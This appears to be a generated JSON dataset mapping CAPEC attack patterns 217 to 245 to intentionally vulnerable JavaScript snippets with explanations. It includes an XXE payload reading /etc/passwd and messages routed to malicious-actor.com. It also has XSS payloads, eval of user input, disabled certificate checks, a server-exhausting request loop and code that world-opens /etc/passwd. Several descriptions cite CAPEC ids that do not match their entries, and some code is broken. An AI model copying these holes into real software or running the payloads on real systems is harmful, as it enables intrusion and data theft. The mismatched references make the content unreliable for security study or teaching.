        "description": "This JavaScript code snippet creates a simple TCP server using the 'net' module. The server listens for incoming connections on port 8080. When data is received, it logs the data to the console and sends a response back to the client. The code embodies the main idea of CAPEC 'Communication Channel Manipulation' by demonstrating several related weaknesses:\n\n1. **Missing Authentication for Critical Function (CWE-306)**: The server does not authenticate the client before processing the data.\n2. **Improper Enforcement of Message Integrity During Transmission (CWE-924)**: The server does not verify the integrity of the received data.\n3. **Improper Verification of Source of a Communication Channel (CWE-940)**: The server does not verify the source of the incoming data.\n4. **Channel Accessible by Non-Endpoint (CWE-300)**: The server does not ensure that the communication channel is only accessible by legitimate endpoints.\n5. **Covert Channel (CWE-514)**: The server could potentially be used to transfer information in unintended ways.\n\nThis code highlights the vulnerabilities that can arise from improper handling and verification of communication channels."
    },
    {
        "capec_id": "217",
        "capec_name": "Exploiting Incorrectly Configured SSL/TLS",
        "code_snippet": "const https = require('https');\n\nconst options = {\n  hostname: 'example.com',\n  port: 443,\n  path: '/',\n  method: 'GET',\n  rejectUnauthorized: false // CWE-294: Disabling SSL/TLS certificate validation\n};\n\nconst req = https.request(options, (res) => {\n  let data = '';\n\n  res.on('data', (chunk) => {\n    data += chunk;\n  });\n\n  res.on('end', () => {\n    console.log('Response:', data);\n  });\n});\n\nreq.on('error', (e) => {\n  console.error('Error:', e);\n});\n\nreq.end();\n\n// CWE-201: Sensitive information is being logged\nconst sensitiveData = 'user:password';\nconsole.log('Sensitive Data:', sensitiveData);",
        "description": "This JavaScript code snippet demonstrates an HTTPS request to a server with SSL/TLS certificate validation disabled (CWE-294), which is a common misconfiguration that can be exploited. The 'rejectUnauthorized: false' option allows the connection to proceed even if the server's certificate is invalid, making it vulnerable to man-in-the-middle attacks. Additionally, the code logs sensitive information (CWE-201), which should not be exposed. This snippet embodies the main idea of CAPEC-Exploiting Incorrectly Configured SSL/TLS by showing how improper SSL/TLS configuration and handling of sensitive data can lead to security vulnerabilities."
    },
    {
        "capec_id": "218",
        "capec_name": "Spoofing of UDDI/ebXML Messages",
        "code_snippet": "const xml2js = require('xml2js');\nconst axios = require('axios');\n\nasync function sendRequest(xmlMessage) {\n  try {\n    // Parse the XML message without validation\n    const parser = new xml2js.Parser({ explicitArray: false });\n    const parsedMessage = await parser.parseStringPromise(xmlMessage);\n\n    // Extract destination URL from the parsed message\n    const destinationUrl = parsedMessage?.Envelope?.Header?.Destination;\n\n    if (!destinationUrl) {\n      throw new Error('Invalid destination URL');\n    }\n\n    // Send the message to the extracted destination URL\n    const response = await axios.post(destinationUrl, xmlMessage, {\n      headers: { 'Content-Type': 'application/xml' }\n    });\n\n    console.log('Response:', response.data);\n  } catch (error) {\n    console.error('Error:', error.message);\n  }\n}\n\n// Example XML message (potentially spoofed)\nconst xmlMessage = `\n<Envelope>\n  <Header>\n    <Destination>http://malicious-actor.com/service</Destination>\n  </Header>\n  <Body>\n    <Transaction>...</Transaction>\n  </Body>\n</Envelope>`;\n\nsendRequest(xmlMessage);",
        "description": "This JavaScript code snippet demonstrates a vulnerability where an XML message is parsed and sent to a destination URL without proper validation. The code uses the 'xml2js' library to parse the XML message and 'axios' to send the message to the extracted destination URL. The lack of XML schema validation (CWE-112) and insufficient verification of the destination URL (CWE-941) make it possible for an attacker to spoof the message and redirect it to a malicious endpoint. This can lead to impersonation of a service provider, disclosure of sensitive information, and potential financial fraud, embodying the main idea of the CAPEC 'Spoofing of UDDI/ebXML Messages'."
    },
    {
        "capec_id": "219",
        "capec_name": "XML Routing Detour Attacks",
        "code_snippet": "const http = require('http');\nconst xml2js = require('xml2js');\n\nconst server = http.createServer((req, res) => {\n  let body = '';\n  req.on('data', chunk => { body += chunk; });\n  req.on('end', () => {\n    xml2js.parseString(body, (err, result) => {\n      if (err) {\n        res.writeHead(400, { 'Content-Type': 'text/plain' });\n        res.end('Invalid XML');\n        return;\n      }\n\n      // CWE-112: Missing XML Validation\n      // CWE-611: Improper Restriction of XML External Entity Reference\n      // CWE-643: Improper Neutralization of Data within XPath Expressions\n      const xmlContent = result;\n      const targetUrl = xmlContent.route.target[0]; // CWE-610: Externally Controlled Reference\n\n      // Forward the request to the target URL\n      const options = {\n        hostname: targetUrl,\n        port: 80,\n        path: '/',\n        method: 'POST',\n        headers: { 'Content-Type': 'application/xml' }\n      };\n\n      const proxyReq = http.request(options, proxyRes => {\n        let proxyData = '';\n        proxyRes.on('data', chunk => { proxyData += chunk; });\n        proxyRes.on('end', () => {\n          res.writeHead(200, { 'Content-Type': 'application/xml' });\n          res.end(proxyData);\n        });\n      });\n\n      proxyReq.on('error', e => {\n        res.writeHead(500, { 'Content-Type': 'text/plain' });\n        res.end('Proxy request failed');\n      });\n\n      proxyReq.write(body);\n      proxyReq.end();\n    });\n  });\n});\n\nserver.listen(8080, () => {\n  console.log('Server listening on port 8080');\n});",
        "description": "This JavaScript code snippet creates an HTTP server that processes incoming XML requests and forwards them to a target URL specified within the XML content. The code demonstrates several vulnerabilities related to XML Routing Detour Attacks (CAPEC-94) and associated CWEs:\n\n1. **CWE-112: Missing XML Validation** - The XML content is parsed without validating against a schema, allowing potentially malicious XML to be processed.\n2. **CWE-611: Improper Restriction of XML External Entity Reference** - The code does not restrict external entity references, which could lead to the inclusion of unintended external resources.\n3. **CWE-643: Improper Neutralization of Data within XPath Expressions** - Although not explicitly shown, the lack of input neutralization could allow XPath injection if XPath queries were used.\n4. **CWE-610: Externally Controlled Reference to a Resource in Another Sphere** - The target URL is extracted from the XML content, allowing an attacker to control the routing of the request.\n\nThe code represents the main idea of an XML Routing Detour Attack by showing how an attacker could manipulate the routing of XML content through an intermediate system, potentially modifying or redirecting the content to an unintended destination."
    },
    {
        "capec_id": "220",
        "capec_name": "Client-Server Protocol Manipulation",
        "code_snippet": "const net = require('net');\n\nconst client = new net.Socket();\nclient.connect(1337, '127.0.0.1', () => {\n    console.log('Connected');\n    // Weak algorithm selection (CWE-757)\n    client.write('AUTH PLAIN weakpassword');\n});\n\nclient.on('data', (data) => {\n    console.log('Received: ' + data);\n    // Capture-replay vulnerability (CWE-294)\n    if (data.toString() === 'AUTH OK') {\n        client.write('REPLAY AUTH PLAIN weakpassword');\n    }\n});\n\nclient.on('close', () => {\n    console.log('Connection closed');\n});\n\n// Incorrectly specified destination (CWE-941)\nclient.connect(1337, '192.168.1.1', () => {\n    console.log('Connected to wrong server');\n});",
        "description": "This JavaScript code snippet demonstrates a client-server protocol manipulation scenario. The client connects to a server using a weak authentication algorithm (CWE-757) by sending 'AUTH PLAIN weakpassword'. Upon receiving an 'AUTH OK' response, the client replays the authentication message (CWE-294). Additionally, the client attempts to connect to an incorrect server address (CWE-941), demonstrating a misconfiguration in specifying the destination. This code embodies the main idea of CAPEC-272 by exploiting weaknesses in the client-server communication protocol."
    },
    {
        "capec_id": "221",
        "capec_name": "Data Serialization External Entities Blowup",
        "code_snippet": "const express = require('express');\nconst fs = require('fs');\nconst xml2js = require('xml2js');\n\nconst app = express();\napp.use(express.text());\n\napp.post('/upload', (req, res) => {\n  const xmlData = req.body;\n  const parser = new xml2js.Parser({\n    explicitEntity: true\n  });\n\n  parser.parseString(xmlData, (err, result) => {\n    if (err) {\n      res.status(400).send('Invalid XML');\n      return;\n    }\n    // Process the parsed XML data\n    res.send('XML processed successfully');\n  });\n});\n\napp.listen(3000, () => {\n  console.log('Server running on port 3000');\n});",
        "description": "This JavaScript code snippet sets up an Express server that accepts XML data via a POST request to the '/upload' endpoint. The xml2js library is used to parse the XML data. The parser is configured with 'explicitEntity: true', which allows external entities to be processed. This can be exploited by an attacker to include external entities that reference large or resource-intensive URIs, potentially leading to a denial of service (DoS) condition. This snippet embodies the main idea of the CAPEC by demonstrating how improper handling of XML external entities can lead to resource exhaustion. The related CWEs provide additional context, such as improper restriction of XML external entities (CWE-611) and improper control of resource identifiers (CWE-99), which are relevant to this vulnerability."
    },
    {
        "capec_id": "222",
        "capec_name": "iFrame Overlay",
        "code_snippet": "<html>\n<head>\n  <title>Vulnerable Page</title>\n</head>\n<body>\n  <iframe src=\"https://trusted-site.com\" style=\"position:absolute; top:0; left:0; width:100%; height:100%; opacity:0.5; z-index:2;\"></iframe>\n  <div style=\"position:absolute; top:0; left:0; width:100%; height:100%; z-index:1;\">\n    <button onclick=\"alert('Action on malicious site!')\">Click Me!</button>\n  </div>\n</body>\n</html>",
        "description": "This code snippet demonstrates an iFrame overlay attack. The main idea is to trick the user into interacting with a seemingly legitimate UI (the button) while actually interacting with an overlaid iFrame from a trusted site. The iFrame is partially transparent and positioned over the entire page, making it difficult for the user to realize they are interacting with a different context. This leverages CWE-1021 (Improper Restriction of Rendered UI Layers or Frames) by not properly restricting the iFrame, CWE-451 (User Interface Misrepresentation of Critical Information) by misrepresenting the UI, and CWE-368 (Context Switching Race Condition) by exploiting the user's context switch between the visible button and the hidden iFrame."
    },
    {
        "capec_id": "224",
        "capec_name": "Fingerprinting",
        "code_snippet": "const http = require('http');\n\nhttp.createServer((req, res) => {\n  if (req.url === '/version') {\n    // Exposing sensitive system information\n    res.writeHead(200, {'Content-Type': 'text/plain'});\n    res.end('Server Version: 1.0.0\\nOS: Linux\\n');\n  } else {\n    res.writeHead(404, {'Content-Type': 'text/plain'});\n    res.end('Not Found');\n  }\n}).listen(8080, () => {\n  console.log('Server running at http://127.0.0.1:8080/');\n});",
        "description": "This JavaScript code snippet creates a simple HTTP server using Node.js. The server listens on port 8080 and responds to requests. If the request URL is '/version', the server responds with sensitive system information, including the server version and operating system. This represents the concept of fingerprinting (CAPEC-170), where an adversary can gather information about the system. The code also embodies CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor) and CWE-497 (Exposure of Sensitive System Information to an Unauthorized Control Sphere) by exposing sensitive details that could be used to identify and exploit the system."
    },
    {
        "capec_id": "226",
        "capec_name": "Session Credential Falsification through Manipulation",
        "code_snippet": "const express = require('express');\nconst cookieParser = require('cookie-parser');\nconst app = express();\n\napp.use(cookieParser());\n\napp.get('/dashboard', (req, res) => {\n  const sessionCookie = req.cookies.sessionID;\n  if (sessionCookie) {\n    // Assume the sessionID is valid without validation\n    res.send('Welcome to your dashboard!');\n  } else {\n    res.status(401).send('Unauthorized');\n  }\n});\n\napp.listen(3000, () => {\n  console.log('Server running on port 3000');\n});",
        "description": "This JavaScript code snippet uses the Express framework to create a simple web server that relies on cookies for session management. The '/dashboard' route checks for the presence of a 'sessionID' cookie and grants access to the dashboard if the cookie exists, without validating the session ID. This embodies the main idea of CAPEC-139: 'Session Credential Falsification through Manipulation'. The code is vulnerable to CWE-565 (Reliance on Cookies without Validation and Integrity Checking) because it assumes the session ID is valid without any verification. It also touches on CWE-472 (External Control of Assumed-Immutable Web Parameter) as the session ID can be manipulated by the client. Additionally, it is susceptible to CWE-384 (Session Fixation) and CWE-613 (Insufficient Session Expiration) since it does not handle session expiration or invalidation properly."
    },
    {
        "capec_id": "227",
        "capec_name": "Sustained Client Engagement",
        "code_snippet": "const http = require('http');\n\nconst options = {\n  hostname: 'target-server.com',\n  port: 80,\n  path: '/resource',\n  method: 'GET'\n};\n\nfunction makeRequest() {\n  const req = http.request(options, res => {\n    res.on('data', chunk => {\n      // Simulate processing time to keep the connection open\n      setTimeout(() => {}, 1000);\n    });\n    res.on('end', () => {\n      // Immediately make another request to sustain engagement\n      makeRequest();\n    });\n  });\n\n  req.on('error', error => {\n    console.error(`Problem with request: ${error.message}`);\n  });\n\n  req.end();\n}\n\n// Start the sustained engagement\nmakeRequest();",
        "description": "This JavaScript code snippet demonstrates a sustained client engagement attack on a target server. The code repeatedly makes HTTP GET requests to a specified resource on the target server. Each response is processed with a delay to keep the connection open longer, simulating resource consumption without crashing the server. Once a response is fully received, another request is immediately made, ensuring continuous engagement. This approach can tie up server resources, making them unavailable to legitimate users. The code embodies the CAPEC concept by exploiting uncontrolled resource consumption (CWE-400) and lack of resource allocation limits (CWE-770)."
    },
    {
        "capec_id": "228",
        "capec_name": "DTD Injection",
        "code_snippet": "const xml2js = require('xml2js');\nconst fs = require('fs');\n\nconst xmlData = `<?xml version=\"1.0\"?>\n<!DOCTYPE root [\n  <!ENTITY xxe SYSTEM \"file:///etc/passwd\">\n]>\n<root>&xxe;</root>`;\n\nxml2js.parseString(xmlData, (err, result) => {\n  if (err) {\n    console.error('Error parsing XML:', err);\n  } else {\n    console.log('Parsed result:', result);\n  }\n});",
        "description": "This JavaScript code snippet demonstrates a DTD Injection vulnerability. It uses the 'xml2js' library to parse an XML string that includes a malicious DTD. The DTD defines an external entity 'xxe' that references the '/etc/passwd' file. When the XML is parsed, the external entity is expanded, potentially exposing sensitive file contents. This example embodies the main idea of CAPEC-112 (DTD Injection) and is related to CWE-611 (Improper Restriction of XML External Entity Reference) and CWE-827 (Improper Control of Document Type Definition). The code highlights how an attacker can inject malicious content into an XML DTD to cause resource depletion or expose sensitive information."
    },
    {
        "capec_id": "229",
        "capec_name": "Serialized Data Parameter Blowup",
        "code_snippet": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst yaml = require('js-yaml');\nconst app = express();\n\napp.use(bodyParser.text({ type: 'application/x-yaml' }));\n\napp.post('/upload', (req, res) => {\n  try {\n    const data = yaml.load(req.body);\n    // Simulate processing of the parsed YAML data\n    res.send('Data processed successfully');\n  } catch (e) {\n    res.status(400).send('Invalid YAML data');\n  }\n});\n\napp.listen(3000, () => {\n  console.log('Server running on port 3000');\n});",
        "description": "This JavaScript code snippet sets up an Express server that accepts YAML data via a POST request. The bodyParser middleware is used to parse the incoming YAML data. The yaml.load function from the 'js-yaml' library is used to parse the YAML data without any restrictions on the size or complexity of the input. This can lead to a denial of service (DoS) condition if an attacker sends a specially crafted YAML file with a large number of nested elements or complex structures, exploiting the 'Allocation of Resources Without Limits or Throttling' (CWE-770). The code does not impose any limits on the size or depth of the YAML data, making it vulnerable to resource exhaustion attacks. Additionally, the code does not handle potential XML External Entity (XXE) attacks (CWE-611) if the YAML data contains XML content."
    },
    {
        "capec_id": "230",
        "capec_name": "Serialized Data with Nested Payloads",
        "code_snippet": "const xml2js = require('xml2js');\n\nconst xmlData = `\n<root>\n  <item>\n    <subitem>\n      <subsubitem>\n        <subsubsubitem>\n          <!-- Nested payloads continue -->\n        </subsubsubitem>\n      </subsubitem>\n    </subitem>\n  </item>\n</root>`;\n\nfunction parseXML(data) {\n  const parser = new xml2js.Parser();\n  parser.parseString(data, (err, result) => {\n    if (err) {\n      console.error('Error parsing XML:', err);\n      return;\n    }\n    console.log('Parsed XML:', result);\n  });\n}\n\nparseXML(xmlData);",
        "description": "This JavaScript code snippet demonstrates a potential vulnerability related to 'Serialized Data with Nested Payloads' (CAPEC). The code uses the 'xml2js' library to parse an XML string that contains deeply nested elements. The lack of validation (CWE-112) and improper input validation (CWE-20) can lead to excessive resource consumption (CWE-674, CWE-770) due to uncontrolled recursion. The deeply nested structure can cause the parser to consume significant memory and CPU resources, potentially leading to a denial of service. This example highlights the importance of validating and limiting the depth of nested structures in serialized data to prevent resource exhaustion attacks."
    },
    {
        "capec_id": "231",
        "capec_name": "Oversized Serialized Data Payloads",
        "code_snippet": "const http = require('http');\nconst xml2js = require('xml2js');\n\nconst server = http.createServer((req, res) => {\n  let body = '';\n  req.on('data', chunk => {\n    body += chunk;\n    // CWE-770: No limit on the size of the data being received\n  });\n\n  req.on('end', () => {\n    // CWE-20: No proper input validation\n    xml2js.parseString(body, (err, result) => {\n      if (err) {\n        res.writeHead(400, {'Content-Type': 'text/plain'});\n        res.end('Invalid XML');\n        return;\n      }\n      // CWE-112: No XML schema validation\n      // CWE-674: Potential for uncontrolled recursion in XML parsing\n      res.writeHead(200, {'Content-Type': 'application/json'});\n      res.end(JSON.stringify(result));\n    });\n  });\n});\n\nserver.listen(3000, () => {\n  console.log('Server running at http://localhost:3000/');\n});",
        "description": "This JavaScript code snippet sets up a basic HTTP server using Node.js that accepts XML data from clients. The server reads the incoming data without imposing any size limits (CWE-770), which can lead to resource exhaustion if an oversized payload is sent. The XML data is then parsed without proper input validation (CWE-20) and without validating the XML against a schema (CWE-112), making it vulnerable to maliciously crafted XML. Additionally, the XML parser could be susceptible to uncontrolled recursion (CWE-674), potentially leading to a stack overflow. This code exemplifies the CAPEC concept of injecting oversized serialized data payloads to exhaust system resources or execute arbitrary code."
    },
    {
        "capec_id": "233",
        "capec_name": "Privilege Escalation",
        "code_snippet": "const userRole = 'guest';\n\nfunction performAdminTask() {\n  if (userRole !== 'admin') {\n    console.log('Access Denied: Insufficient Privileges');\n    return;\n  }\n  console.log('Admin task performed');\n}\n\nfunction elevatePrivileges() {\n  userRole = 'admin'; // CWE-269: Improper Privilege Management\n}\n\nelevatePrivileges(); // CWE-274: Improper Handling of Insufficient Privileges\nperformAdminTask();",
        "description": "This JavaScript code snippet demonstrates a privilege escalation vulnerability. The `userRole` is initially set to 'guest', and the `performAdminTask` function checks if the `userRole` is 'admin' before allowing the task to proceed. However, the `elevatePrivileges` function improperly changes the `userRole` to 'admin' without proper authorization checks (CWE-269: Improper Privilege Management). This allows a user with insufficient privileges to elevate their role and perform admin tasks (CWE-274: Improper Handling of Insufficient Privileges). The code represents the main idea of CAPEC-Privilege Escalation by showing how an adversary can exploit weaknesses to gain unauthorized access to higher privileges."
    },
    {
        "capec_id": "234",
        "capec_name": "Hijacking a privileged process",
        "code_snippet": "const fs = require('fs');\nconst exec = require('child_process').exec;\n\n// Incorrect Permission Assignment for Critical Resource (CWE-732)\nfs.chmodSync('/etc/passwd', 0o777);\n\n// Execution with Unnecessary Privileges (CWE-250)\nexec('sudo somePrivilegedCommand', (error, stdout, stderr) => {\n  if (error) {\n    console.error(`exec error: ${error}`);\n    return;\n  }\n  console.log(`stdout: ${stdout}`);\n  console.error(`stderr: ${stderr}`);\n});\n\n// Incorrect Use of Privileged APIs (CWE-648)\nexec('sudo anotherPrivilegedCommand', (error, stdout, stderr) => {\n  if (error) {\n    console.error(`exec error: ${error}`);\n    return;\n  }\n  console.log(`stdout: ${stdout}`);\n  console.error(`stderr: ${stderr}`);\n});\n\n// Privilege Dropping / Lowering Errors (CWE-271)\nprocess.setuid(1000); // Attempt to drop privileges\nexec('sudo yetAnotherPrivilegedCommand', (error, stdout, stderr) => {\n  if (error) {\n    console.error(`exec error: ${error}`);\n    return;\n  }\n  console.log(`stdout: ${stdout}`);\n  console.error(`stderr: ${stderr}`);\n});",
        "description": "This JavaScript code snippet demonstrates several security weaknesses that could lead to hijacking a privileged process. The code includes: 1) Incorrect Permission Assignment for Critical Resource (CWE-732) by setting world-writable permissions on '/etc/passwd'. 2) Execution with Unnecessary Privileges (CWE-250) by running commands with 'sudo' unnecessarily. 3) Incorrect Use of Privileged APIs (CWE-648) by not properly handling privileged command execution. 4) Privilege Dropping / Lowering Errors (CWE-271) by attempting to drop privileges but still executing a privileged command. These weaknesses can allow an attacker to gain control of a privileged process and execute arbitrary code with elevated privileges."
    },
    {
        "capec_id": "235",
        "capec_name": "DEPRECATED: Implementing a callback to system routine (old AWT Queue)",
        "code_snippet": "const http = require('http');\nconst crypto = require('crypto');\n\nlet sessionToken = null;\n\nfunction generateToken() {\n  return crypto.randomBytes(16).toString('hex');\n}\n\nconst server = http.createServer((req, res) => {\n  if (req.url === '/login' && req.method === 'POST') {\n    sessionToken = generateToken();\n    res.writeHead(200, { 'Set-Cookie': `sessionToken=${sessionToken}` });\n    res.end('Logged in');\n  } else if (req.url === '/secure' && req.method === 'GET') {\n    const cookies = req.headers.cookie;\n    if (cookies && cookies.includes(`sessionToken=${sessionToken}`)) {\n      res.writeHead(200);\n      res.end('Secure data');\n    } else {\n      res.writeHead(403);\n      res.end('Forbidden');\n    }\n  } else {\n    res.writeHead(404);\n    res.end('Not Found');\n  }\n});\n\nserver.listen(3000, () => {\n  console.log('Server running on port 3000');\n});",
        "description": "This JavaScript code snippet creates a simple HTTP server that handles login and secure data access. The server generates a session token upon login and sets it as a cookie. For secure data access, it checks if the session token in the request matches the stored token. This code is vulnerable to a capture-replay attack (CWE-294) because the session token can be captured and replayed by an attacker to gain unauthorized access. Additionally, the use of a non-final static variable (sessionToken) in a multi-threaded context (CWE-1058) can lead to race conditions and improper synchronization issues."
    },
    {
        "capec_id": "236",
        "capec_name": "DEPRECATED: Catching exception throw/signal from privileged block",
        "code_snippet": "const fs = require('fs');\n\nprocess.on('SIGINT', () => {\n  console.log('Caught interrupt signal');\n  fs.writeFileSync('/tmp/privileged_file', 'data'); // CWE-828: Not asynchronous-safe\n});\n\ntry {\n  // Simulate privileged operation\n  let privilegedData = fs.readFileSync('/etc/shadow'); // CWE-782: Insufficient access control\n  console.log('Privileged data read successfully');\n} catch (err) {\n  // CWE-391: Unchecked error condition\n  console.log('Error reading privileged data');\n}\n\n// CWE-294: Capture-replay vulnerability\nconst net = require('net');\nconst client = new net.Socket();\nclient.connect(1337, '127.0.0.1', () => {\n  client.write('AUTHENTICATE user:password');\n});\nclient.on('data', (data) => {\n  console.log('Received: ' + data);\n  client.destroy();\n});",
        "description": "This JavaScript code snippet demonstrates several vulnerabilities related to the deprecated CAPEC pattern of catching exceptions or signals from privileged blocks. The code sets up a signal handler for SIGINT that performs a file write operation, which is not asynchronous-safe (CWE-828). It attempts to read a privileged file without proper access control (CWE-782) and does not handle errors properly (CWE-391). Additionally, it includes a simple network client that sends an authentication message, which could be susceptible to capture-replay attacks (CWE-294). The code illustrates how improper handling of signals, errors, and access control can lead to security vulnerabilities."
    },
    {
        "capec_id": "237",
        "capec_name": "Escaping a Sandbox by Calling Code in Another Language",
        "code_snippet": "const { exec } = require('child_process');\n\nfunction executeNativeCode(command) {\n  exec(command, (error, stdout, stderr) => {\n    if (error) {\n      console.error(`Error: ${error.message}`);\n      return;\n    }\n    if (stderr) {\n      console.error(`Stderr: ${stderr}`);\n      return;\n    }\n    console.log(`Stdout: ${stdout}`);\n  });\n}\n\n// Example of calling native code from JavaScript\nexecuteNativeCode('ls');",
        "description": "This JavaScript code snippet demonstrates the concept of escaping a sandbox by calling code in another language, specifically using Node.js to execute native shell commands. The 'exec' function from the 'child_process' module is used to run a shell command ('ls' in this case). This can be dangerous because it allows JavaScript code to execute arbitrary system commands, potentially leading to a protection mechanism failure (CWE-693) and direct use of unsafe native code (CWE-111). If an attacker can control the input to the 'executeNativeCode' function, they could execute malicious commands, thereby escaping the intended sandbox restrictions."
    },
    {
        "capec_id": "238",
        "capec_name": "DEPRECATED: Using URL/codebase / G.A.C. (code source) to convince sandbox of privilege",
        "code_snippet": "const http = require('http');\nconst url = require('url');\n\nconst server = http.createServer((req, res) => {\n  const parsedUrl = url.parse(req.url, true);\n  const pathname = parsedUrl.pathname;\n\n  // CWE-551: Authorization before parsing and canonicalization\n  if (!isAuthorized(req)) {\n    res.writeHead(403, {'Content-Type': 'text/plain'});\n    res.end('Forbidden');\n    return;\n  }\n\n  // CWE-424: Improper protection of alternate path\n  if (pathname === '/admin') {\n    res.writeHead(200, {'Content-Type': 'text/plain'});\n    res.end('Welcome to the admin panel');\n  } else {\n    res.writeHead(404, {'Content-Type': 'text/plain'});\n    res.end('Not Found');\n  }\n});\n\nfunction isAuthorized(req) {\n  // Simulate an authorization check\n  return req.headers['authorization'] === 'valid-token';\n}\n\nserver.listen(8080, () => {\n  console.log('Server is listening on port 8080');\n});",
        "description": "This JavaScript code snippet creates an HTTP server that demonstrates a vulnerability related to CAPEC's deprecated attack pattern of using URL/codebase to convince a sandbox of privilege. The code includes CWE-551 by performing an authorization check before fully parsing and canonicalizing the URL, which can lead to bypassing authorization. Additionally, it shows CWE-424 by not sufficiently protecting all possible paths to access restricted functionality, such as the '/admin' path. The 'isAuthorized' function simulates an authorization check, but the check is done before the URL is fully parsed, making it possible for an attacker to craft a URL that bypasses the authorization."
    },
    {
        "capec_id": "239",
        "capec_name": "DEPRECATED: Subversion of Authorization Checks: Cache Filtering, Programmatic Security, etc.",
        "code_snippet": "const isAuthenticated = localStorage.getItem('isAuthenticated');\n\nif (isAuthenticated) {\n  // Client-side check for authentication\n  console.log('User is authenticated');\n  // Access sensitive data\n  fetch('/sensitive-data')\n    .then(response => response.json())\n    .then(data => console.log(data));\n} else {\n  console.log('User is not authenticated');\n  // Redirect to login page\n  window.location.href = '/login';\n}",
        "description": "This JavaScript code snippet demonstrates a client-side enforcement of server-side security, which is a common vulnerability (CWE-602). The code checks if the user is authenticated by looking for a flag in the local storage (`isAuthenticated`). If the flag is present, it assumes the user is authenticated and proceeds to fetch sensitive data from the server. This approach is vulnerable because an attacker can easily manipulate the local storage to set the `isAuthenticated` flag, bypassing the authentication check. This embodies the main idea of the deprecated CAPEC, which involves subverting authorization checks by relying on insecure client-side mechanisms."
    },
    {
        "capec_id": "240",
        "capec_name": "Resource Injection",
        "code_snippet": "const http = require('http');\nconst fs = require('fs');\n\nhttp.createServer((req, res) => {\n  const filePath = req.url.substring(1); // Extract file path from URL\n  \n  // Vulnerable to Resource Injection\n  fs.readFile(filePath, (err, data) => {\n    if (err) {\n      res.writeHead(404, {'Content-Type': 'text/plain'});\n      res.end('File not found');\n    } else {\n      res.writeHead(200, {'Content-Type': 'text/plain'});\n      res.end(data);\n    }\n  });\n}).listen(8080, () => {\n  console.log('Server running at http://127.0.0.1:8080/');\n});",
        "description": "This JavaScript code creates a simple HTTP server using Node.js. The server reads a file from the filesystem based on the URL path provided by the client. The code is vulnerable to Resource Injection (CAPEC-99) because it directly uses the URL path as a file path without proper validation. This can allow an attacker to manipulate the URL to access unintended files on the server. The code also demonstrates CWE-20 (Improper Input Validation) as it does not validate the input URL, CWE-1285 (Improper Validation of Specified Index, Position, or Offset in Input) as it does not check the validity of the file path, and CWE-1289 (Improper Validation of Unsafe Equivalence in Input) as it does not ensure the file path is safe. This example highlights the importance of validating and sanitizing input to prevent resource injection vulnerabilities."
    },
    {
        "capec_id": "241",
        "capec_name": "DEPRECATED: Code Injection",
        "code_snippet": "const http = require('http');\nconst url = require('url');\n\nhttp.createServer((req, res) => {\n  const queryObject = url.parse(req.url, true).query;\n  const userInput = queryObject.input;\n\n  try {\n    // Vulnerable to code injection\n    eval(userInput);\n  } catch (e) {\n    res.writeHead(500, {'Content-Type': 'text/plain'});\n    res.end('Server Error');\n    return;\n  }\n\n  res.writeHead(200, {'Content-Type': 'text/plain'});\n  res.end('Executed');\n}).listen(8080);\n\nconsole.log('Server running at http://127.0.0.1:8080/');",
        "description": "This JavaScript code snippet creates an HTTP server that listens for incoming requests. It parses the query parameters from the URL and extracts the 'input' parameter. The code then uses the 'eval' function to execute the user-provided input, which is a classic example of code injection vulnerability (CAPEC-242). This is dangerous because it allows an attacker to execute arbitrary code on the server. The use of 'eval' with user input is a deprecated and insecure practice (CWE-477). The code also lacks proper input validation and sanitization, making it susceptible to various attacks."
    },
    {
        "capec_id": "242",
        "capec_name": "Code Injection",
        "code_snippet": "const http = require('http');\nconst url = require('url');\n\nhttp.createServer((req, res) => {\n  const queryObject = url.parse(req.url, true).query;\n  const userInput = queryObject.input;\n\n  try {\n    // Vulnerable code: directly using user input in eval\n    const result = eval(userInput);\n    res.writeHead(200, {'Content-Type': 'text/plain'});\n    res.end(`Result: ${result}`);\n  } catch (e) {\n    res.writeHead(400, {'Content-Type': 'text/plain'});\n    res.end('Error in input');\n  }\n}).listen(8080);\n\nconsole.log('Server running at http://127.0.0.1:8080/');",
        "description": "This JavaScript code snippet creates an HTTP server that listens for incoming requests. It parses the URL to extract a query parameter named 'input'. The server then uses the 'eval' function to execute the user-provided input as JavaScript code. This is a classic example of code injection (CAPEC-242) and demonstrates CWE-94 (Improper Control of Generation of Code) and CWE-77 (Improper Neutralization of Special Elements used in a Command). The use of 'eval' with untrusted input allows an attacker to inject and execute arbitrary code on the server, leading to potential security vulnerabilities."
    },
    {
        "capec_id": "243",
        "capec_name": "XSS Targeting HTML Attributes",
        "code_snippet": "<a href=\"#\" onmouseover=\"javascript:alert('XSS Attack!')\">Hover over me</a>",
        "description": "This JavaScript code snippet demonstrates a Cross-Site Scripting (XSS) attack targeting HTML attributes, specifically the 'onmouseover' attribute of an anchor tag. When a user hovers over the link, the embedded JavaScript code (alert('XSS Attack!')) is executed. This example embodies the main idea of CAPEC-86, where an adversary inserts malicious scripts into HTML attributes. The related CWEs highlight the improper neutralization of script elements in attributes (CWE-83), especially in IMG tags (CWE-82), and the general failure to sanitize user input in web pages (CWE-79, CWE-80). This snippet shows how an attacker can exploit these weaknesses to execute arbitrary JavaScript code, potentially leading to the theft of sensitive information or other malicious activities."
    },
    {
        "capec_id": "244",
        "capec_name": "XSS Targeting URI Placeholders",
        "code_snippet": "<a href=\"javascript:alert('XSS')\">Click me</a>",
        "description": "This code snippet demonstrates a basic example of an XSS attack targeting URI placeholders. The anchor tag's href attribute contains a 'javascript:' URI scheme, which is a common vector for XSS attacks. When a user clicks on the link, the JavaScript code within the URI is executed, triggering an alert box. This example highlights the vulnerability described in CAPEC-139, where browsers interpret 'javascript:' URIs as executable content. The related CWEs emphasize the importance of properly neutralizing script content in attributes and URI schemes to prevent such attacks."
    },
    {
        "capec_id": "245",
        "capec_name": "XSS Using Doubled Characters",
        "code_snippet": "const userInput = '<<script>alert(\"XSS\")<</script>';\nconst sanitizedInput = userInput.replace(/<</g, '<');\ndocument.body.innerHTML = sanitizedInput;",
        "description": "This JavaScript code snippet demonstrates a vulnerability to 'XSS Using Doubled Characters' (CAPEC-85). The user input contains doubled '<' characters to bypass basic input validation. The `replace` function attempts to sanitize the input by replacing '<<' with '<', but it fails to neutralize the script tag effectively. As a result, the malicious script is executed when the sanitized input is inserted into the web page's DOM. This example highlights the improper neutralization of script-related HTML tags (CWE-80) and the failure to correctly handle invalid characters in identifiers (CWE-86), leading to a cross-site scripting (XSS) vulnerability (CWE-79)."
    },
    {
        "capec_id": "246",
